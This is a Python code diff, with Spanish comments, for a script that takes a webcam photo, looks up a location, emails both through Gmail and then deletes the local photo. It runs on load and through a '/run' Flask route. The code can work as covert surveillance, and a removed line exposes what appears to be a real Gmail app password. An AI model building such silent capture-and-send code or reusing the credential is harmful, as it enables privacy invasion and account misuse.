@@ -18,13 +18,17 @@ def capture_photo():
     # Acceso a la webcam
     cam = cv2.VideoCapture(0)
     result, image = cam.read()
+    cam.release()
+
     if result:
         photo_path = "photo.jpg"
         cv2.imwrite(photo_path, image)
+        print(f"Imagen capturada y guardada en {photo_path}")
+        return photo_path
     else:
-        photo_path = None
-    cam.release()
-    return photo_path
+        print("Error al capturar la imagen")
+        return None
+    
 
 def get_location(api_key):
     # Uso de la API de Google Maps Geolocation para obtener una ubicación más precisa
@@ -64,20 +68,41 @@ def send_email(photo_path, location, address, maps_url):
     body = f"Ubicación: {address}\nLatitud: {location[0]}, Longitud: {location[1]}\nGoogle Maps: {maps_url}\n\nEnlace directo: <a href='{maps_url}'>Ver ubicación en Google Maps</a>"
     msg.attach(MIMEText(body, 'html'))
     
-    if photo_path:
-        attachment = open(photo_path, "rb")
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(attachment.read())
-        encoders.encode_base64(part)
-        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(photo_path)}")
-        msg.attach(part)
+    if photo_path and os.path.exists(photo_path):
+        try:
+            with open(photo_path, "rb") as attachment:
+                part = MIMEBase('application', 'octet-stream')
+                part.set_payload(attachment.read())
+                encoders.encode_base64(part)
+                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(photo_path)}")
+                msg.attach(part)
+            print(f"Imagen adjunta: {photo_path}")
+        except Exception as e:
+            print(f"Error al adjuntar el archivo: {e}")
+    else:
+        print(f"No se encontró el archivo: {photo_path}")
     
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(fromaddr, "ftbq cknu iztg adyu ")  # Cambia aquí con la contraseña de aplicación
-    text = msg.as_string()
-    server.sendmail(fromaddr, toaddr, text)
-    server.quit()
+    try:
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(fromaddr, "tu_contraseña_de_aplicación")  # Cambia aquí con la contraseña de aplicación
+        server.sendmail(fromaddr, toaddr, msg.as_string())
+        server.quit()
+        print("Correo enviado con éxito")
+    except Exception as e:
+        print(f"Error al enviar el correo: {e}")
+    
+    # Elimina el archivo después de enviarlo
+    if os.path.exists(photo_path):
+        os.remove(photo_path)
+        print(f"Archivo eliminado: {photo_path}")
+# Captura y envía la foto
+photo_path = capture_photo()
+if photo_path:
+    location = (40.7128, -74.0060)  # Ejemplo de coordenadas
+    address = "Nueva York, NY"
+    maps_url = "https://maps.google.com/?q=40.7128,-74.0060"
+    send_email(photo_path, location, address, maps_url)
 
 @app.route('/run', methods=['GET'])
 def run_script():
